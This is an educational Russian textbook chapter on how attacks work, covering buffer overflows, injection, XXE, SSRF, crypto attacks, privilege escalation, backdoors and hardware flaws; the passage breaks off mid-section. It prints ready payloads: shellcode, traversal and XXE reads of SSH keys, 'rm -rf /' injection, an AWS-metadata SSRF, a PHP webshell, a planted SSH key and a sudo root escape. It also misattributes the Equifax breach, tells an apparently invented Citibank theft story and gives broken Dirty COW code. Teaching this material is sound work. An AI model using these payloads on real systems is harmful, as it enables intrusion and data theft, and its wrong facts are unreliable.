# Глава 9.6. Методы реализации угроз

## Введение: Как хакеры ломают железо и софт (глубокое погружение в техническую дичь)

Окей, дружище, в главе 9.05 мы разобрали **какие атаки бывают** (фишинг, SQL-инъекция, DDoS, MITM), а в главе 9.04 — **как защищаться** (шифрование, MFA, firewall). Теперь пора нырнуть **в технические детали**: как именно эксплойты работают на низком уровне, как хакеры обходят защиту и почему твой код на C иногда превращается в дырявый сыр.

**Эта глава для технарей**, кто хочет понять:
- Как переполнение буфера позволяет выполнить произвольный код
- Как атаковать CPU через спекулятивное исполнение (Meltdown/Spectre)
- Как менять биты в памяти **физически** (Rowhammer)
- Как обойти ASLR, DEP и другие защиты
- Как работают 0-day эксплойты и почему они стоят миллионы долларов

**Связь с другими главами**:
- **Глава 9.05 (Атаки)** — там обзор, тут — технические детали
- **Глава 9.03 (Угрозы)** и **9.04 (Противодействие)** — связь угроз, атак и защиты
- **Глава 1.02 (Представление данных в памяти)** — понимание стека/кучи критично для buffer overflow
- **Глава 1.09 (Представление чисел)** — integer overflow связан с переполнением типов
- **Глава 2.01 (Архитектура ЭВМ)** — процессор, память, регистры
- **Глава 6.02 (Компиляторы)** — как компилятор создаёт уязвимый код

**Почему это важно?**

Потому что **знание технических методов атак** помогает:
1. **Писать безопасный код** (избегать buffer overflow, race condition, IDOR)
2. **Проводить пентест** (искать уязвимости до того, как их найдут хакеры)
3. **Понимать CVE** (почему Heartbleed позволял читать чужую память)
4. **Оценивать риски** (насколько критична уязвимость, можно ли её эксплуатировать)

**Статистика**:
- **70%** критических уязвимостей — это **memory corruption** (переполнение буфера, use-after-free)
- **0-day эксплойт** для iOS стоит **$1-2 млн** на чёрном рынке (Zerodium, 2023)
- **Heartbleed** (2014) затронул **17%** всех HTTPS-серверов в интернете (~500,000 серверов)
- **Spectre/Meltdown** (2018) затронули **все процессоры Intel/AMD** с 1995 года

**В этой главе разберём**:
1. **Эксплуатация уязвимостей памяти** (Buffer Overflow, Heap Overflow, Format String, Integer Overflow)
2. **Эксплуатация логики приложений** (Race Condition, IDOR, Path Traversal, Command Injection, XXE, SSRF)
3. **Криптографические атаки** (Padding Oracle, Timing Attack, Replay Attack, Downgrade Attack)
4. **Повышение привилегий** (Horizontal/Vertical Privilege Escalation)
5. **Backdoor и Rootkit** (как хакеры оставляют себе доступ)
6. **Сетевые атаки (детали)** (TCP SYN Flood, Slowloris, BGP Hijacking)
7. **Аппаратные уязвимости** (Meltdown/Spectre, Rowhammer, Heartbleed, Shellshock)

---

## 9.6.1. Эксплуатация уязвимостей памяти: Как превратить программу в пушку

### Buffer Overflow (Переполнение буфера)

**Определение**: Запись данных **за границы выделенного буфера**, что позволяет перезаписать соседние данные в памяти (адрес возврата, другие переменные).

**Как это работает?**

Представь, что программа выделила массив на 10 байт в **стеке**:

```c
#include <string.h>
void vulnerable_function(char *input) {
    char buffer[10];  // Выделили 10 байт
    strcpy(buffer, input);  // УЯЗВИМОСТЬ: нет проверки длины!
}

int main() {
    vulnerable_function("AAAAAAAAAAAAAAAAAAAAAAAAAAAA");  // 28 байт
    return 0;
}
```

**Что происходит в памяти** (стек растёт вниз):

```
┌──────────────────┐ ← High memory (старший адрес)
│  Return Address  │ ← Адрес возврата после функции
├──────────────────┤
│  Saved EBP       │ ← Сохранённый указатель фрейма
├──────────────────┤
│  buffer[9]       │
│  buffer[8]       │
│  ...             │
│  buffer[1]       │
│  buffer[0]       │ ← buffer начинается здесь (10 байт)
└──────────────────┘ ← Low memory (младший адрес)
```

**При вводе 28 байт "A"**:
```
┌──────────────────┐
│  0x41414141      │ ← Return Address перезаписан на AAAA (0x41 = 'A')
├──────────────────┤
│  0x41414141      │ ← Saved EBP тоже перезаписан
├──────────────────┤
│  AAAAAAAAAA      │ ← buffer[0..9]
└──────────────────┘
```

**Результат**: Программа попытается вернуться по адресу `0x41414141` → **Segmentation Fault** (крах программы).

**Как хакер использует это?**

Вместо "AAAA..." хакер подставляет:
1. **NOP sled** (последовательность инструкций NOP = "ничего не делать")
2. **Shellcode** (машинный код, который запускает `/bin/sh` — командную оболочку)
3. **Адрес возврата** → указывает на shellcode

**Пример эксплойта**:
```python
# Переполнение буфера для запуска шелла
payload = b"\x90" * 100  # NOP sled (инструкция 0x90 = NOP)
payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68..."  # Shellcode (запуск /bin/sh)
payload += b"\xef\xbe\xad\xde"  # Адрес возврата → на NOP sled

# Отправляем payload в уязвимую программу
os.system(f"./vulnerable_program '{payload.decode('latin1')}'")
```

**Реальный пример — Morris Worm (1988)**:

Первый интернет-червь использовал buffer overflow в **fingerd** (UNIX-демон):
- Отправлял 536-байтовую строку в буфер на 512 байт
- Перезаписывал Return Address → запускал `/bin/sh`
- Заразил **6,000 компьютеров** (10% интернета того времени)
- Ущерб: **$10-100 млн**

**Защита от Buffer Overflow**:

1. **ASLR (Address Space Layout Randomization)**:
   - Рандомизация адресов стека/кучи/библиотек при каждом запуске
   - Хакер не знает, куда писать адрес возврата
   - Включено по умолчанию в Linux/Windows/macOS с ~2007 года

2. **DEP/NX bit (Data Execution Prevention / No-eXecute)**:
   - Запрет выполнения кода из стека/кучи
   - Shellcode в стеке не запустится → программа упадёт
   - Включено по умолчанию в современных ОС

3. **Stack Canary** (канарейка в стеке):
   - Компилятор вставляет **случайное значение** между buffer и Return Address
   - Перед возвратом из функции проверяется canary
   - Если canary изменён → программа завершается с ошибкой
   - Флаг GCC: `-fstack-protector`

   **Пример**:
   ```c
   void function() {
       char buffer[10];
       long canary = RANDOM_VALUE;  // Компилятор добавляет автоматически
       strcpy(buffer, input);
       if (canary != RANDOM_VALUE) abort();  // Обнаружили переполнение!
   }
   ```

4. **Безопасные функции**:
   - `strcpy()` → `strncpy()` (с ограничением длины)
   - `gets()` → `fgets()`
   - `sprintf()` → `snprintf()`

---

### Heap Overflow (Переполнение кучи)

**Отличие от Stack Overflow**: Переполнение в **динамически выделенной памяти** (malloc/new).

**Почему опасно?** Куча содержит метаданные менеджера памяти (указатели на следующий/предыдущий блок, размер блока). Перезаписав метаданные, можно:
- Изменить указатели → записать данные по произвольному адресу
- Вызвать use-after-free (обращение к уже освобождённой памяти)

**Пример уязвимого кода**:
```c
char *buf1 = malloc(100);
char *buf2 = malloc(100);

strcpy(buf1, user_input);  // УЯЗВИМОСТЬ: input может быть > 100 байт
```

Если `user_input` длиннее 100 байт, он перезапишет **метаданные** блока `buf2`.

**Реальный пример — WhatsApp RCE (2019)**:

Heap overflow в библиотеке обработки GIF позволял:
- Отправить специальный GIF в WhatsApp
- Переполнить heap → выполнить произвольный код
- **Заразить телефон без клика** (zero-click exploit)
- Уязвимость затронула **1.5 миллиарда пользователей**

**Защита**:
- **Heap ASLR** (рандомизация адресов кучи)
- **Heap canaries** (проверка целостности метаданных)
- **AddressSanitizer** (ASan) — инструмент для обнаружения ошибок памяти (флаг GCC: `-fsanitize=address`)

---

### Format String Vulnerability (Уязвимость форматной строки)

**Суть**: Передача **пользовательского ввода** как format string в `printf()`, `sprintf()`, `scanf()`.

**Уязвимый код**:
```c
char user_input[100];
scanf("%s", user_input);
printf(user_input);  // ОПАСНО! Должно быть: printf("%s", user_input);
```

**Как это эксплуатируется?**

Пользователь вводит: `"%x %x %x %x"`

**Результат**: `printf` читает значения **из стека** и выводит их в hex:
```
Вывод: 0x7fff5fbff890 0x7fff5fbff8a0 0x00000000 0x41414141
```

Хакер может:
1. **Читать память** (утечка данных): `%x %x %x %x %x %x %x %x`
2. **Писать в память**: `%n` — записывает количество выведенных символов по адресу из стека

**Пример записи в память**:
```c
// Уязвимая программа:
int secret = 0;
printf(user_input);
printf("Secret = %d\n", secret);

// Хакер вводит:
// AAAA%x%x%x%n
//
// Результат:
// - AAAA (4 символа) выводятся
// - %x%x%x читают стек
// - %n записывает число выведенных символов (4 + длина %x) → в адрес 0x41414141 (AAAA)
```

**Реальный пример — CVE-2000-0844 (WU-FTPD)**:

Format string в FTP-сервере позволял:
- Отправить команду: `SITE EXEC %x%x%x%x%n`
- Перезаписать адрес возврата → выполнить shellcode
- Получить root-доступ

**Защита**:
- **ВСЕГДА** используй: `printf("%s", user_input)` вместо `printf(user_input)`
- Компилятор предупреждает: `-Wformat -Wformat-security`

---

### Integer Overflow (Переполнение целых чисел)

**Суть**: Переполнение типа данных (например, `int`, `short`), что приводит к **неожиданному поведению**.

**Пример**:
```c
unsigned char x = 255;  // 8-битное число (max = 255)
x = x + 1;  // Переполнение: 256 → 0 (по модулю 256)
printf("%d", x);  // Вывод: 0
```

**Как это эксплуатируется?**

**Уязвимый код выделения памяти**:
```c
unsigned int size = atoi(user_input);  // Пользователь вводит размер
char *buffer = malloc(size + 1);  // Выделяем size+1 байт
read(fd, buffer, size);  // Читаем size байт
```

**Атака**:
- Хакер вводит `size = 0xFFFFFFFF` (4,294,967,295)
- `size + 1` → **переполнение** → `0` (по модулю 2³²)
- `malloc(0)` вернёт **маленький буфер** (или NULL)
- `read(fd, buffer, 0xFFFFFFFF)` → **переполнение буфера** → RCE

**Реальный пример — iPhone jailbreak (2007)**:

Integer overflow в обработчике TIFF-изображений Safari:
- TIFF-файл содержал поля `width = 0xFFFFFFFF`, `height = 2`
- Вычисление размера: `width * height` → переполнение → маленький размер
- Выделяется маленький буфер, но записывается больше данных → buffer overflow → jailbreak

**Защита**:
- **Проверка границ** перед арифметикой:
  ```c
  if (size > MAX_SIZE - 1) abort();  // Проверка переполнения
  ```
- **SafeInt** (библиотека для безопасной арифметики)
- Флаг GCC: `-ftrapv` (прерывание при переполнении signed int)

---

## 9.6.2. Эксплуатация логики приложений: Когда баги становятся багами в безопасности

### Race Condition (Состояние гонки)

**Определение**: Ошибка, когда поведение программы зависит от **порядка выполнения** операций (например, два потока изменяют одну переменную).

**TOCTOU (Time-Of-Check-Time-Of-Use)** — классический вид race condition:

**Уязвимый код** (проверка баланса перед переводом):
```python
# Поток 1: Перевод 100₽ другу
balance = get_balance(user_id)  # ← Проверка (Time-Of-Check)
if balance >= 100:
    time.sleep(0.1)  # ← Окно уязвимости!
    withdraw(user_id, 100)  # ← Использование (Time-Of-Use)
```

**Атака**:
- У тебя на счету **100₽**
- Ты одновременно запускаешь **два запроса** на перевод 100₽
- Оба потока проверяют баланс → **оба видят 100₽**
- Оба потока снимают 100₽ → итого **-200₽** (баланс уходит в минус)

**Реальный пример — Citibank (2016)**:

Клиент обнаружил race condition в банковском приложении:
- Открыл 2 вкладки браузера
- Одновременно нажал "Перевести все деньги" в обеих вкладках
- Банк отправил **двойную сумму** (списал с его счёта 1000₽, но перевёл 2000₽)
- Украл **$2 млн** до того, как банк заметил

**Защита**:
- **Транзакции БД** с уровнем изоляции `SERIALIZABLE`
- **Блокировки** (locks):
  ```python
  with lock:
      balance = get_balance(user_id)
      if balance >= 100:
          withdraw(user_id, 100)
  ```
- **Atomic операции** (операции, которые нельзя прервать):
  ```sql
  UPDATE accounts SET balance = balance - 100 WHERE user_id = 123 AND balance >= 100;
  ```

---

### IDOR (Insecure Direct Object Reference)

**Определение**: Доступ к чужим данным через **изменение ID** в URL/API.

**Пример уязвимого API**:
```
GET /api/user/profile?id=123
```

Если сервер **не проверяет**, что пользователь имеет право читать профиль `id=123`, хакер может перебрать ID:
```
GET /api/user/profile?id=124  → Профиль другого пользователя
GET /api/user/profile?id=125  → Ещё одного
...
```

**Реальный пример — Parler (2021)**:

После блокировки Parler (соцсети) в январе 2021, исследователи обнаружили IDOR:
- URL постов: `https://parler.com/post/{post_id}`
- **Не было проверки авторизации** → можно читать любой пост
- Исследователи скачали **70+ терабайт данных** (все посты, видео, метаданные, GPS-координаты)
- Это помогло ФБР идентифицировать участников штурма Капитолия

**Защита**:
- **Авторизация на каждом запросе**:
  ```python
  @app.route('/api/user/profile/<int:user_id>')
  def get_profile(user_id):
      if current_user.id != user_id and not current_user.is_admin:
          abort(403)  # Forbidden
      return User.query.get(user_id)
  ```
- **UUID вместо последовательных ID**:
  ```
  /api/user/profile/550e8400-e29b-41d4-a716-446655440000
  ```
  (перебрать UUID невозможно — 2¹²⁸ вариантов)

---

### Path Traversal (Обход путей)

**Определение**: Доступ к файлам **за пределами разрешённой директории** через `../` (переход на уровень выше).

**Уязвимый код**:
```python
@app.route('/download')
def download_file():
    filename = request.args.get('file')
    return send_file(f"/var/www/uploads/{filename}")
```

**Атака**:
```
GET /download?file=report.pdf  → OK (читает /var/www/uploads/report.pdf)
GET /download?file=../../etc/passwd  → Читает /etc/passwd!
GET /download?file=../../../../root/.ssh/id_rsa  → Украл SSH-ключ root!
```

**Реальный пример — Equifax (2017)**:

Path Traversal в веб-приложении позволял:
- Читать файлы за пределами веб-директории
- Украдены **147 млн записей** (SSN, даты рождения, адреса)
- Штраф: **$700 млн**

**Защита**:
- **Whitelist разрешённых файлов**:
  ```python
  allowed_files = ['report.pdf', 'invoice.pdf']
  if filename not in allowed_files:
      abort(403)
  ```
- **Запрет `..` в имени файла**:
  ```python
  if '..' in filename or filename.startswith('/'):
      abort(400)
  ```
- **Canonicalization** (преобразование в абсолютный путь):
  ```python
  import os
  base_dir = "/var/www/uploads/"
  full_path = os.path.realpath(os.path.join(base_dir, filename))
  if not full_path.startswith(base_dir):
      abort(403)
  ```

---

### Command Injection (Инъекция команд)

**Определение**: Выполнение **shell-команд** через пользовательский ввод.

**Уязвимый код**:
```python
import os
ip = input("Введите IP для ping: ")
os.system(f"ping -c 4 {ip}")  # ОПАСНО!
```

**Атака**:
```
Введите IP: 8.8.8.8; cat /etc/passwd
```

**Результат**: Выполнятся **две команды**:
```bash
ping -c 4 8.8.8.8
cat /etc/passwd  # Вывод всех пользователей системы
```

**Ещё хуже**:
```
Введите IP: 8.8.8.8; rm -rf /
```
(Удаление всех файлов на сервере. Шутка для сисадминов: rm -rf / --no-preserve-root)

**Реальный пример — CVE-2014-6271 (Shellshock)**:

Уязвимость в Bash (см. раздел 9.6.6):
- Веб-сервер передавал User-Agent в переменную окружения
- Bash выполнял код из переменной окружения
- Хакер отправлял:
  ```
  User-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd'
  ```
- Результат: выполнение произвольных команд на сервере

**Защита**:
- **НЕ используй `os.system()`** с пользовательским вводом!
- Используй **безопасные API**:
  ```python
  import subprocess
  result = subprocess.run(['ping', '-c', '4', ip], capture_output=True, text=True)
  ```
  (Здесь `ip` передаётся как **аргумент**, а не как часть строки команды)

- **Whitelist** разрешённых символов:
  ```python
  import re
  if not re.match(r'^[0-9.]+$', ip):
      abort(400)  # Разрешены только цифры и точки
  ```

---

### XXE (XML External Entity)

**Определение**: Атака на XML-парсер, который обрабатывает **внешние сущности** (external entities).

**Как это работает?**

XML позволяет определить **сущности** (entities):
```xml
<!DOCTYPE foo [
  <!ENTITY greeting "Hello, World!">
]>
<message>&greeting;</message>
```

Парсер заменит `&greeting;` на `"Hello, World!"`.

**Проблема**: XML поддерживает **внешние сущности** (чтение файлов):
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<message>&xxe;</message>
```

Парсер **прочитает файл `/etc/passwd`** и вставит содержимое в XML!

**Атака**:
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">
]>
<credentials>&xxe;</credentials>
```

Хакер украдёт SSH-ключ root.

**Ещё хуже — SSRF через XXE**:
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/admin">
]>
<request>&xxe;</request>
```

Парсер отправит HTTP-запрос на **внутренний сервер** (обход firewall).

**Реальный пример — Facebook XXE (2014)**:

XXE в обработке DOCX-файлов (DOCX — это ZIP с XML внутри):
- Исследователь загрузил DOCX с XXE payload
- Прочитал файлы на сервере Facebook
- Награда: **$33,500** (bug bounty)

**Защита**:
- **Отключить обработку external entities**:
  ```python
  import xml.etree.ElementTree as ET
  ET.XMLParser(resolve_entities=False)  # Отключаем внешние сущности
  ```
- Использовать **безопасные парсеры** (например, `defusedxml`)

---

### SSRF (Server-Side Request Forgery)

**Определение**: Заставить сервер отправить HTTP-запрос на **внутренний ресурс** или **внешний сервис**, обходя firewall.

**Уязвимый код**:
```python
@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    response = requests.get(url)  # ОПАСНО!
    return response.text
```

**Атака 1 — Чтение внутренних сервисов**:
```
GET /fetch?url=http://localhost:8080/admin
```

Сервер отправит запрос на **внутренний admin-панель** → хакер обойдёт firewall.

**Атака 2 — Чтение метаданных облака**:

В AWS/GCP есть специальный URL для получения метаданных (токены доступа, ключи):
```
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Хакер **украдёт AWS credentials** → получит доступ к S3, EC2, RDS.

**Реальный пример — Capital One (2019)**:

SSRF в веб-приложении Capital One:
- Хакер отправил запрос на метаданные AWS: `http://169.254.169.254/latest/meta-data/...`
- Украл **AWS credentials** → получил доступ к S3-бакету
- Украдены данные **106 млн клиентов**
- Ущерб: **$80-150 млн** (штрафы, судебные издержки)

**Защита**:
- **Whitelist** разрешённых доменов:
  ```python
  allowed_domains = ['api.example.com', 'cdn.example.com']
  if not any(url.startswith(f'https://{d}') for d in allowed_domains):
      abort(403)
  ```
- **Блокировка приватных IP**:
  ```python
  import ipaddress
  host = urlparse(url).hostname
  ip = ipaddress.ip_address(host)
  if ip.is_private or ip.is_loopback:
      abort(403)
  ```
- **Блокировка метаданных облака**: `169.254.169.254`

---

## 9.6.3. Криптографические атаки: Когда математика побеждает шифрование

### Padding Oracle Attack (Атака через оракул заполнения)

**Определение**: Атака на **CBC-режим шифрования**, которая позволяет **расшифровать данные** без знания ключа.

**Как это работает?**

В режиме CBC (Cipher Block Chaining) последний блок дополняется **padding** (заполнением) до нужного размера.

Если сервер возвращает **разные ошибки** для неправильного padding и неправильной подписи, хакер может использовать сервер как **«оракул»** для расшифровки.

**Алгоритм**:
1. Хакер изменяет зашифрованный текст
2. Отправляет на сервер
3. Сервер отвечает:
   - **"Invalid padding"** → padding неверный
   - **"Invalid signature"** → padding верный, но подпись неверная
4. Перебирая байты, хакер узнаёт padding → расшифровывает данные

**Реальный пример — ASP.NET (2010)**:

Padding Oracle в ASP.NET ViewState:
- ViewState — зашифрованные данные сессии (cookies)
- Сервер возвращал разные ошибки для padding/signature
- Хакер расшифровал ViewState → подделал данные → получил admin-доступ

**Защита**:
- **Одинаковые сообщения об ошибках**:
  ```python
  try:
      decrypt_and_verify(ciphertext)
  except:
      return "Invalid data"  # Не раскрываем, что именно неверно
  ```
- Использовать **аутентифицированное шифрование** (AES-GCM вместо AES-CBC)

---

### Timing Attack (Атака по времени)

**Определение**: Определение **секретных данных** по времени выполнения операции.

**Пример уязвимого кода** (сравнение паролей):
```python
def check_password(input_password, correct_password):
    if len(input_password) != len(correct_password):
        return False
    for i in range(len(input_password)):
        if input_password[i] != correct_password[i]:
            return False  # ← Выход при первом несовпадении
    return True
```

**Атака**:
- Хакер пробует пароли: `"aaaaa"`, `"baaaa"`, `"caaaa"`, ..., `"paaaa"`
- Замеряет время ответа:
  - `"aaaaa"` → 1 мкс (первая буква неверна, выход сразу)
  - `"baaaa"` → 1 мкс
  - ...
  - `"paaaa"` → **2 мкс** (первая буква верна, проверяется вторая!)
- Хакер узнал первую букву: **"p"**
- Далее перебирает вторую букву: `"paaaa"`, `"pbaaa"`, ..., `"pasaa"` → время увеличилось → вторая буква "a"
- Так по одной букве за раз вместо перебора всех комбинаций

**Реальный пример — OpenSSL (2003)**:

Timing attack на RSA:
- Время вычисления RSA-подписи зависит от секретного ключа
- Хакер измерял время генерации подписей → восстановил ключ

**Защита**:
- **Constant-time сравнение**:
  ```python
  import hmac
  def secure_compare(a, b):
      return hmac.compare_digest(a, b)  # Всегда проверяет ВСЕ байты
  ```

---

### Replay Attack (Атака повтором)

**Определение**: Перехват **валидного запроса** и его **повторная отправка**.

**Пример**:
1. Жертва отправляет: `POST /transfer { "to": "Bob", "amount": 100, "signature": "xyz" }`
2. Хакер перехватывает запрос
3. Хакер отправляет тот же запрос **снова** → деньги переводятся повторно

**Защита**:
- **Nonce** (одноразовый токен):
  ```json
  { "to": "Bob", "amount": 100, "nonce": "f3a8b2c1", "timestamp": 1609459200 }
  ```
  Сервер запоминает использованные nonce → отклоняет повторы.

- **Timestamp** (временная метка):
  Сервер принимает запросы только если `|timestamp - current_time| < 5 минут`.

---

### Downgrade Attack (Атака понижением)

**Определение**: Принуждение использовать **слабое шифрование** вместо сильного.

**Пример — POODLE (2014)**:

Атака на SSL 3.0:
- HTTPS поддерживает несколько версий: TLS 1.2, TLS 1.1, SSL 3.0
- Хакер (MITM) блокирует TLS-запросы → клиент откатывается на SSL 3.0
- SSL 3.0 имеет уязвимость → хакер расшифровывает трафик

**Защита**:
- **Отключить устаревшие протоколы** (SSL 3.0, TLS 1.0)
- **HSTS (HTTP Strict Transport Security)**:
  ```
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  ```
  Браузер **принудительно** использует HTTPS, запрещает откат на HTTP.

---

### Birthday Attack (Атака днями рождения)

**Суть**: Эксплуатация **парадокса дней рождения** для поиска **коллизий хеш-функций**.

**Парадокс дней рождения**: В группе из **23 человек** вероятность совпадения дня рождения ≈ **50%** (а не 23/365 = 6%, как кажется интуитивно).

**Применение к хеш-функциям**:

Для хеш-функции с выходом **n бит**:
- Всего возможных хешей: **2ⁿ**
- Коллизию можно найти за **√(2ⁿ) = 2^(n/2)** попыток

**Пример**:
- MD5: 128 бит → коллизию найдём за **2⁶⁴ ≈ 10¹⁹** операций (уже реально на практике, найдены коллизии)
- SHA-1: 160 бит → коллизию найдём за **2⁸⁰** операций (найдена в 2017 году, Google/CWI)
- SHA-256: 256 бит → коллизию найдём за **2¹²⁸** операций (пока нереально)

**Атака**:
1. Хакер создаёт **два документа** (легитимный и вредоносный) с **одинаковым хешем**
2. Отправляет легитимный на подпись
3. После подписи подменяет на вредоносный (подпись остаётся валидной!)

**Реальный пример — SHAttered (2017)**:

Google нашла коллизию SHA-1:
- Два разных PDF-файла → **одинаковый SHA-1 хеш**
- Вычисление заняло **6,500 лет процессорного времени**
- Это убило SHA-1: теперь все переходят на SHA-256

**Защита**:
- Не используй **MD5/SHA-1** для безопасности
- Используй **SHA-256, SHA-3, BLAKE2**

---

## 9.6.4. Повышение привилегий: Как обычный юзер становится админом

**Определение**: **Privilege Escalation** — получение **более высоких привилегий**, чем изначально предоставлены.

### Horizontal Privilege Escalation

**Определение**: Доступ к данным **другого пользователя** того же уровня (не админа).

**Пример**: Пользователь A читает email пользователя B (оба обычные юзеры).

Это **IDOR** (см. раздел 9.6.2).

---

### Vertical Privilege Escalation

**Определение**: Обычный пользователь получает **admin-доступ**.

**Способы**:

1. **Эксплуатация уязвимости ядра** (kernel exploit):
   - Уязвимость в драйвере/syscall
   - Выполнение кода в kernel mode → root

2. **Sudo misconfiguration**:
   ```bash
   # Проверка разрешённых sudo-команд
   sudo -l
   
   # Вывод:
   (ALL) NOPASSWD: /usr/bin/vim
   ```
   
   **Эксплойт**:
   ```bash
   sudo vim -c ':!bash'  # Запускаем bash из vim с правами root
   ```

3. **SUID-бинарники** (файлы с битом SUID → выполняются с правами владельца):
   ```bash
   # Поиск SUID-бинарников
   find / -perm -4000 2>/dev/null
   
   # Нашли:
   -rwsr-xr-x 1 root root /usr/bin/old_binary
   ```
   
   Если `old_binary` уязвим (buffer overflow, command injection) → RCE с правами root.

**Реальный пример — Dirty COW (2016)**:

**CVE-2016-5195** — уязвимость в Linux kernel (существовала **9 лет**, с 2007 года).

**Суть**:
- Race condition в механизме **Copy-On-Write** (COW)
- Позволяла записать в **read-only файлы** (например, `/etc/passwd`)
- Обычный пользователь → **root** за секунды

**Эксплойт**:
```c
// Dirty COW эксплойт (упрощённо)
int fd = open("/etc/passwd", O_RDONLY);  // Открываем read-only
void *map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0);

// Race condition: одновременно читаем и пишем в map
while (1) {
    write(fd, "root::0:0::/root:/bin/bash\n", 27);  // Перезаписываем пароль root на пустой
}
```

**Результат**: Вход как `root` без пароля.

**Защита**:
- **Обновлять ядро** (патч вышел в течение недели)
- **SELinux/AppArmor** (ограничение доступа к syscalls)

---

## 9.6.5. Backdoor и Rootkit: Как хакеры остаются в системе навсегда

### Backdoor (Бэкдор, Чёрный ход)

**Определение**: Скрытый **метод обхода аутентификации** для получения доступа к системе.

**Типы**:

1. **Легальные бэкдоры** (созданы разработчиком):
   - **Master password** в софте (для восстановления доступа)
   - **Debug-интерфейс**, оставленный в production (telnet, SSH с дефолтным паролем)

2. **Нелегальные бэкдоры** (созданы хакером после взлома):
   - **Webshell** (PHP/JSP файл на веб-сервере):
     ```php
     <?php system($_GET['cmd']); ?>
     ```
     URL: `http://site.com/shell.php?cmd=whoami` → выполнение команд
   
   - **SSH-ключ** в `/root/.ssh/authorized_keys`:
     ```bash
     echo "ssh-rsa AAAAB3NzaC1yc2EAAAA... hacker@evil.com" >> /root/.ssh/authorized_keys
     ```
     Хакер может войти по SSH без пароля.
   
   - **Cron job** (периодический запуск backdoor):
     ```bash
     */5 * * * * /tmp/.hidden/backdoor.sh  # Каждые 5 минут
     ```

**Реальный пример — Juniper backdoor (2015)**:

В коде ScreenOS (Juniper Networks) нашли **два бэкдора**:
1. **Unauthorised VPN decryption**: Juniper (или АНБ) могли расшифровывать VPN-трафик
2. **Master password**: `<<< %s(un='%s') = %u` → вход в систему без авторизации

**Как попало?** Неясно: либо инсайдер, либо взлом, либо спецслужбы. Затронуты **тысячи устройств** по всему миру.

**Защита**:
- **Code review** (проверка кода на backdoors)
- **Integrity monitoring** (контроль целостности файлов):
  ```bash
  # AIDE (Advanced Intrusion Detection Environment)
  aide --check  # Проверяет, изменились ли системные файлы
  ```
- **Регулярный аудит** SSH-ключей, cron jobs, systemd services

---

### Rootkit (Руткит)

**Определение**: Набор инструментов для **скрытия присутствия** злоумышленника в системе (скрывает процессы, файлы, сетевые соединения).

**Типы**:

1. **User-mode rootkit** (работает в пространстве пользователя):
   - Подменяет системные утилиты: `ps`, `ls`, `netstat`
   - Пример: заменяет `/bin/ps` → не показывает процесс хакера

2. **Kernel-mode rootkit** (работает в ядре):
   - Модифицирует ядро Linux (LKM — Loadable Kernel Module)
   - **Hooking системных вызовов** (перехват `open()`, `read()`, `write()`)
   
   **Пример**:
   ```c
   // Rootkit перехватывает syscall read()
   asmlinkage long hooked_read(unsigned int fd, char __user *buf, size_t count) {
       long ret = original_read(fd, buf, count);
       if (strstr(buf, "hacker_process")) {
           // Удаляем строку с именем процесса хакера из вывода ps
           remove_line(buf, "hacker_process");
       }
       return ret;
   }
   ```

3. **Bootkit** (заражение загрузчика):
   - Модифицирует **MBR (Master Boot Record)** или **UEFI firmware**
   - Загружается **до ОС** → обходит антивирусы
   
**Реальный пример — Sony BMG rootkit (2005)**:

Sony встроила rootkit в **музыкальные CD** (защита от копирования):
- При вставке CD в Windows → автоматически устанавливается rootkit
- Rootkit скрывал файлы, начинающиеся с `$sys$`
- **Уязвимость**: любой вирус мог назвать себя `$sys$virus.exe` → стать невидимым
- Sony отозвала **22 миллиона дисков**, заплатила **$5.75 млн** в судебных издержках

**Защита**:
- **Детекторы rootkit**: `rkhunter`, `chkrootkit`
- **UEFI Secure Boot** (проверка подписи загрузчика)
- **Kernel integrity checks** (например, Linux Kernel Runtime Guard — LKRG)

---

## 9.6.6. Аппаратные уязвимости: Когда уязвим процессор, а не код

### Meltdown и Spectre (2018)

**Определение**: Уязвимости в **CPU**, связанные с **спекулятивным выполнением** инструкций.

**Что такое спекулятивное выполнение?**

Процессор **предсказывает** ветвление кода и **исполняет инструкции заранее** (чтобы не простаивать в ожидании условия).

**Пример**:
```c
if (user_has_access) {
    data = read_secret();  // ← CPU исполняет ЭТО даже ДО проверки if!
}
```

Если предсказание неверное, результат **откатывается**. НО: данные уже **попали в кэш** CPU!

**Атака**:
1. Хакер вызывает код, который **читает секретные данные**
2. CPU спекулятивно исполняет чтение → данные попадают в кэш
3. Хакер измеряет **время доступа к кэшу** (cache timing attack) → восстанавливает данные

**Meltdown** (CVE-2017-5754):
- Уязвимость в **Intel CPU** (почти все процессоры с 1995 года)
- Позволяет **user-mode процессу** читать **kernel memory** (пароли, ключи, данные других процессов)

**Spectre** (CVE-2017-5753, CVE-2017-5715):
- Уязвимость в **Intel, AMD, ARM**
- Позволяет процессу читать память **других процессов** (обход изоляции)

**Реальные последствия**:
- Затронуты **миллиарды устройств** (ПК, серверы, смартфоны)
- Патчи **замедляют** производительность на **5-30%**
- **Облачные провайдеры** (AWS, Google Cloud, Azure) экстренно патчили серверы

**Защита**:
- **Микрокод CPU** (обновление прошивки процессора)
- **KPTI (Kernel Page Table Isolation)** — изоляция памяти ядра (Linux patch)
- **Retpoline** (техника компиляции для обхода Spectre)

**Вывод**: **Даже железо уязвимо**. Аппаратные баги невозможно исправить патчем софта → нужно менять процессор (или мириться с замедлением).

---

### Rowhammer (2014)

**Определение**: **Физическая атака на DRAM**, позволяющая **изменить биты в памяти** без программного доступа.

**Как это работает?**

В DRAM данные хранятся в **конденсаторах** (заряд = 1, нет заряда = 0). Конденсаторы **теряют заряд** со временем → нужна периодическая **перезарядка (refresh)**.

**Атака**:
1. Хакер **многократно читает** одну строку памяти (row) — миллионы раз в секунду
2. Из-за **электромагнитной интерференции** соседние строки теряют заряд быстрее
3. Если не успели сделать refresh → **биты меняются** (1 → 0 или 0 → 1)

**Эксплойт**:
```c
while (1) {
    *addr1;  // Читаем одну строку памяти
    *addr2;  // Читаем другую строку
    clflush(addr1);  // Сбрасываем кэш
    clflush(addr2);
}
// Через несколько миллионов итераций → биты в соседней строке изменились
```

**Применение**:
